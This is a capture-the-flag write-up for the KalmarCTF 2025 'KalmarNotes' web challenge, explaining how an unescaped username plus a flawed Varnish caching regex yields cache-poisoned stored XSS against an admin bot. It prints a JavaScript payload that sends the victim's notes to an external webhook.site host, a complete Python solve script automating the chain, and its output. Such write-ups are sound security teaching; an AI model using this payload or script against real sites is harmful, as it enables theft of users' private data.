# KalmarNotes

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @siunam
- 51 solves / 197 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Every CTF needs a note taking challenge, here is ours.

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152340.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152527.png)

In here, we can create different notes, but we'll need to register a new account first:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152648.png)

and then login to our new account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152736.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152759.png)

Let's create a new note via the "New Note" link!

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152837.png)

After creating that note, we'll be redirected to the home page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311152957.png)

We can then view our note in the short or long version:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311153258.png)

Short version:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311153313.png)

Long version:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311153324.png)

In both version, we can delete the note by clicking the "Delete" button.

With that said, let's read this web application's source code to have a better understanding of this web application!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/web/KalmarNotes/kalmarnotes.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarNotes)-[2025.03.11|15:34:20(HKT)]
└> file kalmarnotes.zip 
kalmarnotes.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarNotes)-[2025.03.11|15:34:21(HKT)]
└> unzip kalmarnotes.zip 
Archive:  kalmarnotes.zip
   creating: kalmarnotes/
  inflating: kalmarnotes/requirements.txt  
  inflating: kalmarnotes/Dockerfile  
  inflating: __MACOSX/kalmarnotes/._Dockerfile  
  inflating: kalmarnotes/default.vcl  
  inflating: kalmarnotes/supervisord.conf  
  inflating: kalmarnotes/docker-compose.yml  
  [...]
  inflating: kalmarnotes/src/templates/view_note_long.html  
  inflating: kalmarnotes/src/templates/new_note.html  
  inflating: kalmarnotes/src/templates/view_note_short.html  
```

After reading it a little bit, we can have the following findings:
1. This web application is written in Python with framework [Flask](https://flask.palletsprojects.com/)
2. It also uses [Varnish HTTP Cache](https://varnish-cache.org/) to cache different requests

Let's dive deeper into those code!

First off, what's the objective in this challenge? Where's the flag?

In `kalmarnotes/src/db.py`, we can see that the flag is inserted into database table `notes` via method `_initialize_db` in class `Database`:

```python
import sqlite3
[...]
class Database:
    [...]
    def _initialize_db(self):
            with closing(self.connect_db()) as db:
                with db as conn:
                    [...]
                    flag = os.getenv('FLAG', 'default_flag')
                    [...]
                    random_large_id = random.randint(1, 100000000000)
                    conn.execute('''
                        INSERT OR IGNORE INTO notes (id, user_id, title, content)
                        VALUES (?, 1, 'Flag', ?)
                    ''', (random_large_id, flag))
```

In here, the flag note's ID a random ID, and it is belonged to `user_id` 1.

If we take a look at the table `users` structure, column `id` is the primary key, and it'll automatically increment:

```python
class Database:
    [...]
    def _initialize_db(self):
            with closing(self.connect_db()) as db:
                with db as conn:
                    conn.execute('''
                        CREATE TABLE IF NOT EXISTS users (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            username TEXT UNIQUE NOT NULL,
                            password TEXT NOT NULL
                            )
                    ''')
                    [...]
```

So, the first user being inserted into the database has user ID `1`. In our case, the user is called `admin`:

```python
class Database:
    [...]
    def _initialize_db(self):
            with closing(self.connect_db()) as db:
                with db as conn:
                    [...]
                    admin_pass = hashlib.sha256(os.getenv('ADMIN_PASSWORD', 'kalmar').encode()).hexdigest()
                    [...]
                    conn.execute('''
                        INSERT OR IGNORE INTO users (username, password)
                        VALUES (?, ?)
                    ''', ('admin', admin_pass))
```

Therefore, we need to **somehow read user `admin`'s flag note**.

Side note here, although table `notes`'s primary key `id` will be automatically increment, method `_initialize_db` will reset that increment counter to `0`:

```python
class Database:
    [...]
    def _initialize_db(self):
            with closing(self.connect_db()) as db:
                with db as conn:
                    [...]
                    conn.execute('''
                        UPDATE sqlite_sequence SET seq = 0 WHERE name = 'notes'
                    ''')
```

So maybe we can't create a new note and decrement our note ID to get the flag note's ID?

Wait, can we even read other users' notes? Does the application have an IDOR (Insecure Direct Object Reference) vulnerability that allows us to do so?

If we look at the Flask application in `kalmarnotes/src/app.py`, there are 3 routes that read different notes, like `/note/<int:note_id>/<string:view_type>`, GET route `/api/note/<int:note_id>`, and GET route `/api/notes`. However, they only read our own user's notes.

For example, GET route `/api/note/<int:note_id>`:

```python
from flask import Flask, render_template, request, jsonify, session, redirect
[...]
from db import Database
[...]
app = Flask(__name__)
[...]
@app.route('/api/note/<int:note_id>', methods=['GET'])
@authenticated_only
def api_get_note(note_id):
    note = db.get_note_by_id(note_id, session.get('user_id'))
    if note:
        return jsonify({'note': note})
    else:
        return jsonify({'error': 'Note not found'}), 404
```

```python
class Database:
    [...]
    def get_note_by_id(self, note_id, user_id):
        with closing(self.connect_db()) as db:
            cursor = db.execute('''
                SELECT id, title, content, user_id FROM notes WHERE id = ?
            ''', (note_id,))
            row = cursor.fetchone()
            if row and row[3] == user_id:
                note = {'id': row[0], 'title': row[1], 'content': row[2], 'user_id': row[3]}
                return self.sanitize_dict(note)
            return None
```

In the above `get_note_by_id` method, after fetching the given note ID's note record, if our user ID doesn't equal to the record's `user_id` (`row[3]`), it'll just return `None`.

So, nope, this web application doesn't have an IDOR vulnerability in reading other users' notes.

But! It does have an IDOR vulnerability in deleting other users' notes via DELETE route `/api/note/<int:note_id>`:

```python
@app.route('/api/note/<int:note_id>', methods=['DELETE'])
@authenticated_only
def api_delete_note(note_id):
    success = db.delete_note_by_id(note_id, session.get('user_id'))
    if success:
        return jsonify({'message': 'Note deleted successfully'})
    else:
        return jsonify({'error': 'Note deletion failed'}), 400
```

```python
class Database:
    [...]
    def delete_note_by_id(self, note_id, user_id):
        with closing(self.connect_db()) as db:
            with db as conn:
                cursor = conn.execute('''
                    DELETE FROM notes WHERE id = ?
                ''', (note_id,))
                return cursor.rowcount > 0
```

As you can see, variable `user_id` in method `delete_note_by_id` is not even used, and it doesn't check the note is really belong to the correct user.

Is that useful? Maybe? Let's keep on reading.

In this Flask app, it also has a GET route `/api/report`, which allows us to send a URL to the admin bot and let it visit to our given URL by calling method `visit`:

```python
from admin_bot import AdminBot
[...]
admin_bot = AdminBot()
[...]
@app.route('/api/report', methods=['POST'])
def report_note():
    data = request.get_json()
    url = data.get('url')
    [...]
    if not url.startswith('http://') and not url.startswith('https://'):
        return jsonify({'error': 'Invalid URL format'}), 400

    if [...]:
        [...]
    else:
        success = admin_bot.visit(url)
    [...]
```

If we read `kalmarnotes/src/admin_bot.py`, when class `AdminBot` is initialized, the `__init__` magic method will setup a [headless Chrome browser](https://developer.chrome.com/docs/chromium/headless) via library [Selenium](https://www.selenium.dev/):

```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
[...]
class AdminBot:
    [...]
    def __init__(self):
        self.user_data_dir = '/tmp/chrome_admin_session'
        
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--disable-software-rasterizer')
        chrome_options.add_argument('--js-flags=--noexpose_wasm,--jitless')
        
        self.driver = webdriver.Chrome(options=chrome_options)
        self.driver.set_page_load_timeout(10)
```

In method `visit`, if the admin bot is not logged in, it'll call method `login`: 

```python
class AdminBot:
    [...]
    def visit(self, note_url):
        [...]
        try:
            if not self.logged_in:
                self.login()
                if not self.logged_in:
                    raise Exception("Failed to login")

            [...]
            return True
            
        except Exception as e:
            [...]
        [...]
```

Which simply go to the web application's login page, type username `admin` and the password, and submit the login form:

```python
class AdminBot:
    [...]
    def login(self):
        try:
            hostname = os.getenv('HOSTNAME', 'localhost')
            domain = f'http://localhost:80' if hostname == 'localhost' else f'https://{hostname}'

            password = os.getenv('ADMIN_PASSWORD', 'kalmar')

            self.driver.get(domain+'/login')
            
            username_field = self.driver.find_element(By.NAME, 'username')
            password_field = self.driver.find_element(By.NAME, 'password')
            
            username_field.send_keys('admin')
            password_field.send_keys(password)
            password_field.submit()
            
            self.logged_in = True
            
        except Exception as e:
            print(f"Login failed: {str(e)}")
            self.logged_in = False
```

After logging in, the headless browser will go to our given URL:

```python
class AdminBot:
    [...]
    def visit(self, note_url):
        [...]
        try:
            [...]
            self.driver.get(note_url)
            time.sleep(1)
            return True
            
        except Exception as e:
            [...]
        [...]
```

With that said, we should somehow **find some client-side vulnerabilities to exfiltrate the admin bot's flag note**!

After reading the HTML templates, the Flask template engine, [Jinja](https://jinja.palletsprojects.com/en/stable/), does something interesting with our input. For example, `kalmarnotes/src/templates/view_note_short.html`:

```html
[...]
<div class="card-header bg-primary text-white">
    <h4 class="mb-0">{{ note.title | safe }}</h4>
</div>
<div class="card-body">
    <div class="mb-3">{{ note.content | safe }}</div>
    <button class="btn btn-danger" onclick="deleteNote({{ note.id | safe }})">Delete</button>
</div>
[...]
```

In here, the note's `title`, `content`, and `id` used [filter `safe`](https://jinja.palletsprojects.com/en/stable/templates/#jinja-filters.safe). According to Jinja's documentation, it says:

> Mark the value as safe which means that in an environment with automatic escaping enabled this variable will not be escaped. - [https://jinja.palletsprojects.com/en/stable/templates/#jinja-filters.safe](https://jinja.palletsprojects.com/en/stable/templates/#jinja-filters.safe)

[By default](https://jinja.palletsprojects.com/en/stable/templates/#html-escaping), Jinja template engine will automatically HTML entity encode the variable's value. **If the template uses filter `safe`, the value will not be HTML entity encoded, thus allowing potential XSS (Cross-Site Scripting) vulnerability**.

Moreover, in template `kalmarnotes/src/templates/notes.html`, it uses [`innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) to directly display our notes:

```html
<script>
    (async () => {
        try {
            const response = await fetch('/api/notes');
            const data = await response.json();

            const notesList = document.getElementById('notes-list');
            [...]
            data.notes.forEach(note => {
                const noteElement = document.createElement('a');
                noteElement.href = `/note/${note.id}/long`;
                [...]
                noteElement.innerHTML = `
                    <div class="card-body d-flex justify-content-between align-items-start">
                        <div>
                            <h5 class="card-title">${note.title}</h5>
                            <p class="card-text text-muted">${note.content.substring(0, 50)}...</p>
                        </div>
                        <div>
                            <a href="/note/${note.id}/short" class="btn btn-primary btn-sm me-2">View short version</a>
                            <button onclick="event.preventDefault(); deleteNote('${note.id}')" class="btn btn-danger btn-sm">
                                Delete
                            </button>
                        </div>
                    </div>
                `;
                notesList.appendChild(noteElement);
            });

        } catch (error) {
            [...]
        } finally {
            [...]
        }
    })();
</script>
```

Ah ha! So maybe we can achieve stored XSS via injecting our payload in our note's `title` or `content`? Well, nope.

If we look at method like `get_all_notes_for_user` in class `Database`, it actually sanitizes our notes by calling method `sanitize_dict`:

```python
class Database:
    [...]
    def get_all_notes_for_user(self, user_id):
        with closing(self.connect_db()) as db:
            cursor = db.execute('''
                SELECT id, title, content FROM notes WHERE user_id = ?
            ''', (user_id,))
            notes = [{'id': row[0], 'title': row[1], 'content': row[2]} for row in cursor.fetchall()]
            return self.sanitize_dict(notes)
```

```python
from markupsafe import escape
[...]
class Database:
    [...]
    def sanitize_dict(self,data):
        if isinstance(data, dict):
            return {key: self.sanitize_dict(value) for key, value in data.items()}
        elif isinstance(data, list):
            return [self.sanitize_dict(item) for item in data]
        elif isinstance(data, str):
            return escape(data)
        else:
            return data
```

In this method, it'll recursively sanitize the given dictionary, which uses library [MarkupSafe](https://markupsafe.palletsprojects.com/en/stable/)'s function [escape](https://markupsafe.palletsprojects.com/en/stable/escaping/#markupsafe.escape) to HTML entity encode the data.

If we take a look at that function's logic, it simply replaces character `&`, `>`, `<`, `'`, and `"` with their own HTML entity encoding character:

```python
def escape(s: t.Any) -> Markup:
    [...]
    return Markup(
        str(s)
        .replace("&", "&amp;")
        .replace(">", "&gt;")
        .replace("<", "&lt;")
        .replace("'", "&#39;")
        .replace('"', "&#34;")
    )
```

With that being said, it seems like we couldn't achieve XSS by injecting our payload in our notes' `title` and `content`.

Hmm... Is there any other way to do so?

In template `kalmarnotes/src/templates/view_note_long.html`, we can see something is different from the short version template:

```html
[...]
<div class="card-header bg-dark text-white">
    [...]
    <small>Written by {{ username | safe }}</small>
</div>
[...]
```

Huh, **the `username` variable is also NOT HTML entity encoded**?

If we look at route `/note/<int:note_id>/<string:view_type>`, if URL parameter `view_type` is `long`, it'll render that template with variable `username`, which is the return value of method `get_username_from_id` from class `Database`:

```python
@app.route('/note/<int:note_id>/<string:view_type>')
@authenticated_only
def view_note(note_id, view_type):
    note = db.get_note_by_id(note_id, session.get('user_id'))
    [...]
    if view_type == "short":
        [...]
    elif view_type == "long":
        return render_template('view_note_long.html',note=note,username=db.get_username_from_id(session.get('user_id')))
    [...]
```

In method `get_username_from_id`, it'll get our user's username:

```python
class Database:
    [...]
    def get_username_from_id(self, user_id):
        with closing(self.connect_db()) as db:
            cursor = db.execute('''
                SELECT username FROM users WHERE id = ?
            ''', (user_id,))
            row = cursor.fetchone()
            if row:
                return row[0]
            return None
```

So... Maybe we should be able to inject our XSS payload into our username?

In POST route `/api/register`, **the register logic didn't sanitize our username** at all:

```python
@app.route('/api/register', methods=['POST'])
def api_create_user():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    password_hashed = hashlib.sha256(password.encode()).hexdigest()
    
    user = db.create_new_user(username, password_hashed)
    if user:
        return jsonify({'message': 'User created successfully'})
    else:
        return jsonify({'error': 'User creation failed'}), 400
```

```python
class Database:
    def create_new_user(self, username, password):
        try:
            with closing(self.connect_db()) as db:
                with db as conn:
                    cursor = conn.execute('''
                        INSERT INTO users (username, password)
                        VALUES (?, ?)
                    ''', (username, password))
                    return {'id': cursor.lastrowid, 'username': username}
        except Exception as e:
            print(f"Error creating user: {e}")
            return None
```

Let's try to register a new user with a simple XSS payload in our username, `<script>alert(document.domain)</script>`!

```http
POST /api/register HTTP/2
Host: b5b5616f803aea138236147c5301829b-44533.inst1.chal-kalmarc.tf
Content-Length: 76
Content-Type: application/json;charset=UTF-8

{"username":"<script>alert(document.domain)</script>","password":"password"}
```

Then, login, create a new note, and go to the long version of the new note:

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311165811.png)

Nice! We got stored XSS!

But wait a minute... We can only view our own note. Currently, this is a **self-XSS**. **How to make the admin bot view our note??**

Hmm... Maybe caching can help us?

If we read `kalmarnotes/default.vcl`, this application's Varnish configuration, we can see that [Varnish built-in subroutine](https://varnish-cache.org/docs/6.0/users-guide/vcl-built-in-subs.html) [`vcl_recv`](https://varnish-cache.org/docs/6.0/users-guide/vcl-built-in-subs.html#vcl-recv) has this logic:

```
sub vcl_recv {
    if (req.url ~ "\.(js|css|png|gif)$") {
        set req.http.Cache-Control = "max-age=10";
        return (hash);
    }
}
```

According to that built-in subroutine documentation, this subroutine will be called at the beginning of a request. In this case, if the request's URL matches regular expression (regex) pattern `\.(js|css|png|gif)$`, it'll set the `Cache-Control` response header to `max-age=10` and pass the control over to [`vcl_hash`](https://varnish-cache.org/docs/6.0/users-guide/vcl-built-in-subs.html#vcl-hash) (`return (hash)`).

After hashing our request URL, it'll eventually call built-in subroutine [`vcl_deliver`](https://varnish-cache.org/docs/6.0/users-guide/vcl-built-in-subs.html#vcl-deliver) to set response header `X-Cache: Miss/Hit` and `X-Cache-Hits: <obj.hits>`:

```
sub vcl_deliver {
    if (obj.hits > 0) {
        set resp.http.X-Cache = "HIT";
    } else {
        set resp.http.X-Cache = "MISS";
    }
    set resp.http.X-Cache-Hits = obj.hits;
}
```

Hmm... Looks like the cache will be hit when our request URL matches this regex:

```
\.(js|css|png|gif)$
```

Well, this regex is flawed. As long as our request URL ends with something like `.js`, our request is cached:

```http
GET /note/126588202765/long?.js HTTP/2
Host: b5b5616f803aea138236147c5301829b-44533.inst1.chal-kalmarc.tf
Cookie: session=eyJ1c2VyX2lkIjoyfQ.Z8_7DQ.1KQIw30edxTFfpnn0WJ60HpSlTw


```

Response:

```http
HTTP/2 200 OK
[...]
Cache-Control: max-age=10
[...]
Age: 6
[...]
X-Cache: HIT
X-Cache-Hits: 3
```

Therefore, we can escalate the **self-XSS vulnerability to stored XSS via cache poisoning**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/KalmarCTF-2025/images/Pasted%20image%2020250311172021.png)

Nice! So we can now exfiltrate the admin bot's session cookie and view the flag note, right?

```python
app.config.update(
    SESSION_COOKIE_SAMESITE='Strict',
    SESSION_COOKIE_HTTPONLY=True
)
```

Oh, the session has flag `httpOnly`!!

But don't worry, we can just use our payload to read all the admin bot's notes via GET route `/api/notes`, and exfiltrate the JSON notes object to our attacker server, like the following:

```html
<script>
fetch('/api/notes')
  .then(response => response.json())
  .then(jsonResponse => fetch(`//webhook.site/638a21c2-2009-4d8e-99f6-ca9e3c3e8a69?notes=${JSON.stringify(jsonResponse)}`))
</script>
```

## Exploitation

Armed with above information, we can read the flag note's content via the following steps:
1. Register a new user with our XSS payload in the username
2. Create a new note
3. Cache poisoning the note (Make sure cache is hit)
4. Report the poisoned note to the admin bot

To automate the above step, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import random
from string import ascii_letters

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.isLocal = False
        self.RANDOM_PASSWORD = Solver.generateRandomString(10)
        self.REGISTER_ENDPOINT = '/api/register'
        self.LOGIN_ENDPOINT = '/api/login'
        self.CREATE_NEW_NOTE_ENDPOINT = '/api/note/new'
        self.GET_ALL_NOTES_ENDPOINT = '/api/notes'
        self.VIEW_NOTE_ENDPOINT = '/note'
        self.LONG_NOTE_TYPE = 'long'
        self.CACHE_EXTENSIONS = {
            'js': '.js',
            'css': '.css',
            'png': '.png',
            'gif': '.gif'
        }
        self.TARGET_CACHE_AGE = 5
        self.REPORT_ENDPOINT = '/api/report'

    def generateRandomString(length):
        return ''.join(random.choice(ascii_letters) for i in range(length))

    def register(self, xssPayload):
        data = {
            'username': xssPayload,
            'password': self.RANDOM_PASSWORD
        }
        print(f'[*] Registering new user with username "{data["username"]}" | Password: "{data["password"]}"')

        response = self.session.post(f'{self.baseUrl}{self.REGISTER_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to register a new user')
            exit(0)
        print('[+] Registered a new user')

    def login(self, xssPayload):
        data = {
            'username': xssPayload,
            'password': self.RANDOM_PASSWORD
        }
        print(f'[*] Loggin user "{data["username"]}"')

        response = self.session.post(f'{self.baseUrl}{self.LOGIN_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to login to that user')
            exit(0)
        print('[+] Registered a new user')

    def createNewNote(self, title='foo', content='bar'):
        data = {
            'title': title,
            'content': content
        }
        print('[*] Creating a new note')

        response = self.session.post(f'{self.baseUrl}{self.CREATE_NEW_NOTE_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to create a new note')
            exit(0)

        print('[+] Created a new note')

    def getRandomNoteId(self):
        print('[*] Getting a random note ID')
        response = self.session.get(f'{self.baseUrl}{self.GET_ALL_NOTES_ENDPOINT}')
        if response.status_code != 200:
            print('[-] Unable to get a random note ID')
            exit(0)

        # just get the first note, we don't care about which note that we are 
        # gonna do cache poisoning
        randomNoteId = str(response.json()['notes'][0]['id'])
        print(f'[+] Random note ID: {randomNoteId}')
        return randomNoteId

    def cachePoisoning(self, noteId, cacheExtension='js'):
        print(f'[*] Poisoning note ID {noteId}')
        cacheHitNumber = 0
        url = str()
        for _ in range(11):
            url = f'{self.baseUrl}{self.VIEW_NOTE_ENDPOINT}/{noteId}/{self.LONG_NOTE_TYPE}?{self.CACHE_EXTENSIONS[cacheExtension]}'
            response = self.session.get(url)
            
            cacheHitNumber = int(response.headers['X-Cache-Hits'])
            print(f'[*] Current cache hits: {cacheHitNumber}', end='\r')

            if cacheHitNumber == self.TARGET_CACHE_AGE:
                break

        if cacheHitNumber == 0:
            print(f'\n[-] Unable to poison note ID {noteId}')
            exit(0)

        print(f'\n[+] Note ID {noteId} is now poisoned with age {cacheHitNumber}! URL: {url}')
        return url

    def reportToAdminBot(self, poisonedUrl):
        data = {
            'url': poisonedUrl
        }
        print(f'[*] Reporting to the admin bot with URL: {data["url"]}')
        response = requests.post(f'{self.baseUrl}{self.REPORT_ENDPOINT}', json=data)
        if response.status_code != 200:
            print('[-] Unable to report the URL to the admin bot')
            exit(0)

        print('[+] Reported to the admin bot. Check your exfiltrated attacker server to see if there\'s any new request.')

    def solve(self, xssPayload, isPayloadAppendRandomUsername=True):
        if 'localhost' in self.baseUrl:
            self.isLocal = True

        # avoid keep registering with the exact same username
        if isPayloadAppendRandomUsername:
            xssPayload += Solver.generateRandomString(10)

        self.register(xssPayload)
        self.login(xssPayload)
        self.createNewNote()
        randomNoteId = self.getRandomNoteId()

        poisonedUrl = self.cachePoisoning(randomNoteId)
        self.reportToAdminBot(poisonedUrl)

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'https://42582f7d651545634d8c119d86d4ad62-49590.inst1.chal-kalmarc.tf'
    solver = Solver(baseUrl)
    
    xssPayload = '<script>fetch(`/api/notes`).then(response => response.json()).then(jsonResponse => fetch(`//webhook.site/638a21c2-2009-4d8e-99f6-ca9e3c3e8a69?notes=${JSON.stringify(jsonResponse)}`))</script>'
    solver.solve(xssPayload)
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/KalmarCTF-2025/web/KalmarNotes)-[2025.03.11|18:33:05(HKT)]
└> python3 solve.py
[*] Registering new user with username "<script>fetch(`/api/notes`).then(response => response.json()).then(jsonResponse => fetch(`//webhook.site/638a21c2-2009-4d8e-99f6-ca9e3c3e8a69?notes=${JSON.stringify(jsonResponse)}`))</script>vzLQlyMhWM" | Password: "zINLJFThmP"
[+] Registered a new user
[*] Loggin user "<script>fetch(`/api/notes`).then(response => response.json()).then(jsonResponse => fetch(`//webhook.site/638a21c2-2009-4d8e-99f6-ca9e3c3e8a69?notes=${JSON.stringify(jsonResponse)}`))</script>vzLQlyMhWM"
[+] Registered a new user
[*] Creating a new note
[+] Created a new note
[*] Getting a random note ID
[+] Random note ID: 126054782064
[*] Poisoning note ID 126054782064
[*] Current cache hits: 5
[+] Note ID 126054782064 is now poisoned with age 5! URL: https://42582f7d651545634d8c119d86d4ad62-49590.inst1.chal-kalmarc.tf/note/126054782064/long?.js
[*] Reporting to the admin bot with URL: https://42582f7d651545634d8c119d86d4ad62-49590.inst1.chal-kalmarc.tf/note/126054782064/long?.js
[+] Reported to the admin bot. Check your exfiltrated attacker server to see if there's any new request.
```

- **Flag: `kalmar{c4ch3_m3_0ut51d3_h0w_b0w_d4h}`**

## Conclusion

What we've learned:

1. Self-XSS to stored XSS via cache poisoning